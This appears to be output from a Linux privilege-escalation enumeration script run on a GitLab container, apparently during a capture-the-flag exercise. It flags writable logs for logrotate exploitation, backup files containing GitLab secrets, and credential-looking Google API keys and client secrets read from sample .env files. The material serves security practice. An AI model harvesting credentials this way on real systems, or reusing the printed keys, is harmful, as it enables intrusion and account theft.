-rw-r----- 1 root git 601 Dec  4 14:14 /var/opt/gitlab/gitaly/config.toml
-rw-r----- 1 root git 1064 Dec  4 14:12 /var/opt/gitlab/gitlab-shell/config.yml
-rw-r----- 1 root git 52 Dec  4 14:13 /var/opt/gitlab/gitlab-workhorse/config.toml
-rw-r----- 1 root git 17681 Dec  4 14:12 /var/opt/gitlab/gitlab-rails/etc/gitlab.yml
-rw-r----- 1 root git 527 Dec  4 14:12 /var/opt/gitlab/gitlab-rails/etc/database.yml

[+] Modified interesting files in the last 5mins (limit 100)
/var/opt/gitlab/redis/dump.rdb
/var/log/gitlab/gitaly/current
/var/log/gitlab/gitlab-workhorse/current
/var/log/gitlab/sidekiq/current
/var/log/gitlab/gitlab-rails/sidekiq_exporter.log
/var/log/gitlab/gitlab-rails/production_json.log
/var/log/gitlab/gitlab-rails/production.log
/var/log/gitlab/unicorn/unicorn_stderr.log
/var/log/gitlab/gitlab-monitor/current

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
logrotate Not Found
Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log.7.gz
Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log
Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log.1.gz
Writable: /var/log/gitlab/gitlab-rails/production_json.log.1.gz
Writable: /var/log/gitlab/gitlab-rails/production_json.log.2.gz
Writable: /var/log/gitlab/gitlab-rails/production.log.3.gz
Writable: /var/log/gitlab/unicorn/unicorn_stderr.log.4.gz
Writable: /var/log/gitlab/unicorn/unicorn_stderr.log.2.gz
Writable: /var/log/gitlab/unicorn/unicorn_stdout.log.7.gz

[+] Files inside /var/opt/gitlab (limit 20)
total 128
drwxr-xr-x 1 root              root              4096 May 30 18:00 .
drwxr-xr-x 1 root              root              4096 Nov 20  2018 ..
-rw-r--r-- 1 git               git                220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 git               git               3771 Aug 31  2015 .bashrc
drwxr-xr-x 2 git               git               4096 Dec  4 14:12 .bundle
-rw-r--r-- 1 git               git                287 Dec  4 14:12 .gitconfig
-rw-r--r-- 1 git               git                655 May 16  2017 .profile
drwx------ 2 git               git               4096 Dec  4 14:12 .ssh
drwxr-x--- 3 gitlab-prometheus root              4096 May 30 18:00 alertmanager
drwx------ 2 git               root              4096 Dec  4 14:12 backups
-rw------- 1 root              root                38 Dec  4 14:14 bootstrapped
drwxr-xr-x 2 gitlab-consul     gitlab-consul     4096 Nov 20  2018 consul
drwx------ 3 git               root              4096 Dec  4 14:12 git-data
drwx------ 2 git               root              4096 May 30 18:00 gitaly
drwxr-xr-x 3 git               root              4096 Dec  4 14:12 gitlab-ci
drwxr-xr-x 2 git               root              4096 May 30 18:00 gitlab-monitor
drwxr-xr-x 9 git               root              4096 May 30 18:00 gitlab-rails
drwx------ 2 git               root              4096 May 30 18:00 gitlab-shell
drwxr-x--- 2 git               gitlab-www        4096 May 30 18:00 gitlab-workhorse
drwx------ 3 root              root              4096 May 30 18:10 logrotate
drwxr-xr-x 2 mattermost        mattermost        4096 Nov 20  2018 mattermost
drwxr-x--- 1 root              gitlab-www        4096 Feb 11 14:28 nginx

[+] Files inside others home (limit 20)
/home/dude/.bash_logout
/home/dude/.bashrc
/home/dude/.profile
/home/dude/user.txt

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup folders
drwxr-xr-x 2 root root 4096 Apr 12  2016 /var/backups
total 0

drwx------ 2 git root 4096 Dec  4 14:12 /var/opt/gitlab/backups
total 0

drwx------ 2 git root 4096 Dec  4 14:12 /var/opt/gitlab/backups
total 0

drwxr-xr-x 2 root root 4096 Dec  7 09:25 /opt/backup
total 100
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb

drwxr-xr-x 3 root root 4096 Dec  4 14:12 /opt/gitlab/embedded/cookbooks/cache/backup
total 4
drwxr-xr-x 3 root root 4096 Dec  4 14:12 var


[+] Backup files (limited 100)
-rw-r--r-- 1 root root 26343 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/doc/raketasks/backup_restore.md
-rw-r--r-- 1 root root 139 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/db/migrate/20150331183602_add_devise_two_factor_backupable_to_users.rb
-rw-r--r-- 1 root root 7998 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/lib/tasks/gitlab/backup.rake
-rw-r--r-- 1 root root 53 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/lib/backup.rb
-rwxr-xr-x 1 root root 83232 Nov 20  2018 /opt/gitlab/embedded/postgresql/9.6.8/bin/pg_basebackup
-rw-r--r-- 1 root root 763 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/compute/google/requests/set_target_pool_backup.rb
-rw-r--r-- 1 root root 540 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/requests/sql/get_backup_run.rb
-rw-r--r-- 1 root root 745 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/requests/sql/list_backup_runs.rb
-rw-r--r-- 1 root root 669 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/requests/sql/insert_backup_run.rb
-rw-r--r-- 1 root root 890 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/requests/sql/restore_instance_backup.rb
-rw-r--r-- 1 root root 509 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/requests/sql/delete_backup_run.rb
-rw-r--r-- 1 root root 1170 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/models/sql/backup_runs.rb
-rw-r--r-- 1 root root 997 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/lib/fog/google/models/sql/backup_run.rb
-rw-r--r-- 1 root root 567 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/spec/devise/models/two_factor_backupable_spec.rb
-rw-r--r-- 1 root root 1755 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/lib/devise_two_factor/models/two_factor_backupable.rb
-rw-r--r-- 1 root root 895 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/lib/devise_two_factor/strategies/two_factor_backupable.rb
-rw-r--r-- 1 root root 2789 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/lib/devise_two_factor/spec_helpers/two_factor_backupable_shared_examples.rb
-rw-r--r-- 1 root root 1027 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/examples/volume/backups.rb
-rw-r--r-- 1 root root 107 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/get_backup_details.rb
-rw-r--r-- 1 root root 110 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/list_backups_detailed.rb
-rw-r--r-- 1 root root 103 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/restore_backup.rb
-rw-r--r-- 1 root root 102 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/delete_backup.rb
-rw-r--r-- 1 root root 101 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/list_backups.rb
-rw-r--r-- 1 root root 102 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/requests/create_backup.rb
-rw-r--r-- 1 root root 391 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/models/backups.rb
-rw-r--r-- 1 root root 293 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v2/models/backup.rb
-rw-r--r-- 1 root root 789 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/get_backup_details.rb
-rw-r--r-- 1 root root 1152 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/list_backups_detailed.rb
-rw-r--r-- 1 root root 416 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/restore_backup.rb
-rw-r--r-- 1 root root 454 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/delete_backup.rb
-rw-r--r-- 1 root root 302 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/list_backups.rb
-rw-r--r-- 1 root root 1178 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/requests/create_backup.rb
-rw-r--r-- 1 root root 601 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/models/backups.rb
-rw-r--r-- 1 root root 1062 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/models/backup.rb
-rw-r--r-- 1 root root 107 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/get_backup_details.rb
-rw-r--r-- 1 root root 110 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/list_backups_detailed.rb
-rw-r--r-- 1 root root 103 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/restore_backup.rb
-rw-r--r-- 1 root root 102 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/delete_backup.rb
-rw-r--r-- 1 root root 101 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/list_backups.rb
-rw-r--r-- 1 root root 102 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/requests/create_backup.rb
-rw-r--r-- 1 root root 391 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/models/backups.rb
-rw-r--r-- 1 root root 293 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-openstack-0.1.21/lib/fog/volume/openstack/v1/models/backup.rb
-rw-r--r-- 1 root root 5169 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/unit/util/backup_spec.rb
-rw-r--r-- 1 root root 3187 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/lib/chef/util/backup.rb
-rw-r--r-- 1 root root 1499 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/unicorn-5.1.0/.CHANGELOG.old
-rw-r--r-- 1 root root 1014 May 30 17:59 /run/blkid/blkid.tab.old

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bootstrap_form-2.7.0/test/dummy/db/test.sqlite3
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/checksums.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/contents.cache.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/packages.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/references.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/release.caches.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_mime-1.0.1/lib/db/content_type_mime.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_mime-1.0.1/lib/db/ext_mime.db
Found: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mousetrap-rails-1.4.6/spec/dummy/db/test.sqlite3
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bootstrap_form-2.7.0/test/dummy/db/test.sqlite3 (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/checksums.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/contents.cache.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/packages.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/references.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/apt/var/www/apt/db/release.caches.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_mime-1.0.1/lib/db/content_type_mime.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_mime-1.0.1/lib/db/ext_mime.db (limit 20)
 -> Extracting tables from /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mousetrap-rails-1.4.6/spec/dummy/db/test.sqlite3 (limit 20)

[+] Web files?(output limit)

[+] Readable hidden interesting files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
lrwxrwxrwx 1 root root 9 Dec  7 16:58 /home/dude/.bash_history -> /dev/null
Searching possible passwords inside /home/dude/.bash_history (limit 100)

-rw-r--r-- 1 dude dude 3771 Aug 31  2015 /home/dude/.bashrc
-rw-r--r-- 1 dude dude 655 May 16  2017 /home/dude/.profile
-rw-r--r-- 1 git git 3771 Aug 31  2015 /var/opt/gitlab/.bashrc
-rw-r--r-- 1 git git 287 Dec  4 14:12 /var/opt/gitlab/.gitconfig
-rw-r--r-- 1 git git 655 May 16  2017 /var/opt/gitlab/.profile
-rw-r--r-- 1 gitlab-consul gitlab-consul 3771 Aug 31  2015 /var/opt/gitlab/consul/.bashrc
-rw-r--r-- 1 gitlab-consul gitlab-consul 3771 Aug 31  2015 /var/opt/gitlab/consul/.bashrc
-rw-r--r-- 1 gitlab-consul gitlab-consul 655 May 16  2017 /var/opt/gitlab/consul/.profile
-rw-r--r-- 1 gitlab-consul gitlab-consul 655 May 16  2017 /var/opt/gitlab/consul/.profile
-rw-r--r-- 1 git git 66 May 30 18:26 /var/opt/gitlab/git-data/repositories/slyone/project3032.wiki.git/config
-rw-r--r-- 1 git git 66 May 30 18:14 /var/opt/gitlab/git-data/repositories/slyone/project4081.wiki.git/config
-rw-r--r-- 1 git git 66 May 30 18:14 /var/opt/gitlab/git-data/repositories/slyone/project7468.wiki.git/config
-rw-r--r-- 1 mattermost mattermost 3771 Aug 31  2015 /var/opt/gitlab/mattermost/.bashrc
-rw-r--r-- 1 mattermost mattermost 3771 Aug 31  2015 /var/opt/gitlab/mattermost/.bashrc
-rw-r--r-- 1 mattermost mattermost 655 May 16  2017 /var/opt/gitlab/mattermost/.profile
-rw-r--r-- 1 mattermost mattermost 655 May 16  2017 /var/opt/gitlab/mattermost/.profile
-rw-r--r-- 1 gitlab-psql gitlab-psql 3771 Aug 31  2015 /var/opt/gitlab/postgresql/.bashrc
-rw-r--r-- 1 gitlab-psql gitlab-psql 3771 Aug 31  2015 /var/opt/gitlab/postgresql/.bashrc
-rw-r--r-- 1 gitlab-redis gitlab-redis 3771 Aug 31  2015 /var/opt/gitlab/redis/.bashrc
-rw-r--r-- 1 gitlab-redis gitlab-redis 655 May 16  2017 /var/opt/gitlab/redis/.profile
-rw-r--r-- 1 registry registry 3771 Aug 31  2015 /var/opt/gitlab/registry/.bashrc
-rw-r--r-- 1 registry registry 3771 Aug 31  2015 /var/opt/gitlab/registry/.bashrc
-rw-r--r-- 1 registry registry 655 May 16  2017 /var/opt/gitlab/registry/.profile
-rw-r--r-- 1 registry registry 655 May 16  2017 /var/opt/gitlab/registry/.profile
-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 257 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/google-api-client-0.23.4/samples/cli/.env
Reading /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/google-api-client-0.23.4/samples/cli/.env
GOOGLE_API_KEY=AIzaSyC6GvjvPlEzJpTW2bW2t0MPHQTfltTosHk
GOOGLE_CLIENT_ID=479164972499-i7j6av7bp2s4on5ltb7pj2lb2iu5a8gi.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=JBotCTG5biFWGz43jdQSZaa3
GOOGLE_APPLICATION_CREDENTIALS=~/Downloads/ruby-samples-cred.json

-rw-r--r-- 1 root root 136 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/google-api-client-0.23.4/samples/web/.env
Reading /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/google-api-client-0.23.4/samples/web/.env
GOOGLE_CLIENT_ID=479164972499-snopeoggfam8j6ku1i9g2kljb3c4hov6.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=CoRocezZGyCv2Kb0uJ-js0rD

-rwxr-xr-x 1 root root 953 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-1.6.10/test/cgi/lighttpd.conf
Checking for creds on /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-1.6.10/test/cgi/lighttpd.conf

-rwxr-xr-x 1 root root 953 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-1.6.11/test/cgi/lighttpd.conf
Checking for creds on /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-1.6.11/test/cgi/lighttpd.conf

-rwxr-xr-x 1 root root 953 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-2.0.5/test/cgi/lighttpd.conf
Checking for creds on /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/rack-2.0.5/test/cgi/lighttpd.conf

-rw-r--r-- 1 git git 3771 Aug 31  2015 /var/opt/gitlab/.bashrc
-rw-r--r-- 1 git git 287 Dec  4 14:12 /var/opt/gitlab/.gitconfig
-rw-r--r-- 1 git git 655 May 16  2017 /var/opt/gitlab/.profile
-rw-r--r-- 1 gitlab-consul gitlab-consul 3771 Aug 31  2015 /var/opt/gitlab/consul/.bashrc
-rw-r--r-- 1 gitlab-consul gitlab-consul 655 May 16  2017 /var/opt/gitlab/consul/.profile
-rw-r--r-- 1 git git 66 May 30 18:26 /var/opt/gitlab/git-data/repositories/slyone/project3032.wiki.git/config
-rw-r--r-- 1 git git 66 May 30 18:14 /var/opt/gitlab/git-data/repositories/slyone/project4081.wiki.git/config
-rw-r--r-- 1 git git 66 May 30 18:14 /var/opt/gitlab/git-data/repositories/slyone/project7468.wiki.git/config
-rw-r--r-- 1 mattermost mattermost 3771 Aug 31  2015 /var/opt/gitlab/mattermost/.bashrc
-rw-r--r-- 1 mattermost mattermost 655 May 16  2017 /var/opt/gitlab/mattermost/.profile
-rw-r--r-- 1 gitlab-psql gitlab-psql 3771 Aug 31  2015 /var/opt/gitlab/postgresql/.bashrc
-rw-r--r-- 1 gitlab-redis gitlab-redis 3771 Aug 31  2015 /var/opt/gitlab/redis/.bashrc
-rw-r--r-- 1 gitlab-redis gitlab-redis 655 May 16  2017 /var/opt/gitlab/redis/.profile
-rw-r--r-- 1 registry registry 3771 Aug 31  2015 /var/opt/gitlab/registry/.bashrc
-rw-r--r-- 1 registry registry 655 May 16  2017 /var/opt/gitlab/registry/.profile

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 2760 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-shell/.gitlab-ci.yml
-rw-r--r-- 1 root root 6 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-shell/.ruby-version
-rw-r--r-- 1 root root 248 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-shell/.codeclimate.yml
-rw-r--r-- 1 root root 1039 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-shell/.rubocop.yml
-rw-r--r-- 1 root root 7615 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.scss-lint.yml
-rw-r--r-- 1 root root 2407 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.eslintrc.yml
-rw-r--r-- 1 root root 26993 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.gitlab-ci.yml
-rw-r--r-- 1 root root 1961 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.mailmap
-rw-r--r-- 1 root root 571 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.csscomb.json
-rw-r--r-- 1 root root 831 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.babelrc.js
-rw-r--r-- 1 root root 21846 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.rubocop_todo.yml
-rw-r--r-- 1 root root 7 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.nvmrc
-rw-r--r-- 1 root root 866 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.pkgr.yml
-rw-r--r-- 1 root root 11 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.foreman
-rw-r--r-- 1 root root 6 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.ruby-version
-rw-r--r-- 1 root root 510 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.codeclimate.yml
-rw-r--r-- 1 root root 80 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.prettierignore
-rw-r--r-- 1 root root 213 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.prettierrc
-rw-r--r-- 1 root root 175 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.eslintignore
-rw-r--r-- 1 root root 2951 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.rubocop.yml
-rw-r--r-- 1 root root 3508 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.haml-lint.yml
-rw-r--r-- 1 root root 1151693 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/public/assets/.sprockets-manifest-a75f4a585ce826a3a481b231bc9350ec.json
-rw-r--r-- 1 root root 1367 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/background_migration/.rubocop.yml
-rw-r--r-- 1 root root 32 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/.gitattributes
-rw-r--r-- 1 root root 1380 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.travis.yml
-rw-r--r-- 1 root root 6 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.ruby-version
-rw-r--r-- 1 root root 1974 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.kitchen.yml
-rw-r--r-- 1 root root 515 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.rubocop.yml
-rw-r--r-- 1 root root 95 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.kitchen.digitalocean.yml
-rw-r--r-- 1 root root 1533 Nov 20  2018 /opt/gitlab/embedded/cookbooks/acme/.kitchen.dokken.yml
-rw-r--r-- 1 root root 2736 Nov 20  2018 /opt/gitlab/embedded/cookbooks/compat_resource/.travis.yml
-rw------- 1 root root 1380 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.travis.yml
-rw------- 1 root root 6 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.ruby-version
-rw------- 1 root root 1974 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.kitchen.yml
-rw------- 1 root root 515 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.rubocop.yml
-rw------- 1 root root 95 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.kitchen.digitalocean.yml
-rw------- 1 root root 1533 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/acme/.kitchen.dokken.yml
-rw------- 1 root root 2736 Dec  1 12:41 /opt/gitlab/embedded/cookbooks/cache/cookbooks/compat_resource/.travis.yml
-rw-r--r-- 1 root root 74 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/grape_logging-1.7.0/.travis.yml
-rw-r--r-- 1 root root 420 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.travis.yml
-rw-r--r-- 1 root root 4 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.ruby-version
-rw-r--r-- 1 root root 31 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.yardopts
-rw-r--r-- 1 root root 23 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.rspec
-rw-r--r-- 1 root root 96 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.pelusa.yml
-rw-r--r-- 1 root root 7 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/virtus-1.0.5/.ruby-gemset
-rw-r--r-- 1 root root 45 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/wikicloth-0.8.1/.travis.yml
-rw-r--r-- 1 root root 386 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/deckar01-task_list-2.0.0/.travis.yml
-rw-r--r-- 1 root root 357 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.travis.yml
-rw-r--r-- 1 root root 34 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.hound.yml
-rw-r--r-- 1 root root 200 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.editorconfig
-rw-r--r-- 1 root root 7937 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.rubocop.yml
-rw-r--r-- 1 root root 1212 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.fog.example
-rw-r--r-- 1 root root 11 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.ruby-gemset
-rw-r--r-- 1 root root 31 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/.codecov.yml
-rw-r--r-- 1 root root 266 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_portile2-2.3.0/.travis.yml
-rw-r--r-- 1 root root 1819 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_portile2-2.3.0/.concourse.yml
-rw-r--r-- 1 root root 118 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/uber-0.1.0/.travis.yml
-rw-r--r-- 1 root root 330 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/omniauth-oauth-1.1.0/.travis.yml
